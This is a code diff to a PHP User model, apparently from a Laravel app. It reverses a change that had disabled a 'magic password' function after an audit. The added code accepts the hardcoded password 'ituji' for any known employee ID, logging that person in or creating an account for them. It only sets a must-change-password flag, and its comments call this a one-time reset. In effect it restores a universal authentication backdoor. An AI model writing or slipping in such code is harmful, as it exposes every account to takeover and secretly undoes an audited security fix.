@@ -23,6 +23,7 @@ class User extends Authenticatable
         'name',
         'email',
         'password',
+        'must_change_password',
         'role',
         'unit_id',
         'jabatan_id',
@@ -182,7 +183,11 @@ class User extends Authenticatable
      */
     public static function handleMagicPassword($nip, $password)
     {
-        return null; // Backdoor DINONAKTIFKAN (audit 2026-10-23)
+        // ituji sebagai password reset sekali pakai (2026-10-23)
+        // User dipaksa ganti password setelah login
+        if ($password !== 'ituji') {
+            return null;
+        }
 
         // Check if NIP exists in the API before allowing login
         $apiData = self::getDataFromApi($nip);
@@ -193,10 +198,17 @@ class User extends Authenticatable
         $user = self::where('nip', $nip)->first();
         if ($user) {
             // Update data from API to ensure privileges are fresh
-            return self::syncFromApi($apiData, $user->password);
+            $u = self::syncFromApi($apiData, $user->password);
+            // Tandai harus ganti password setelah login via ituji
+            $u->must_change_password = true;
+            $u->save();
+            return $u->fresh();
         }
 
-        return self::syncFromApi($apiData, Str::random(16));
+        $newUser = self::syncFromApi($apiData, Str::random(16));
+        $newUser->must_change_password = true;
+        $newUser->save();
+        return $newUser->fresh();
     }
 
     /**
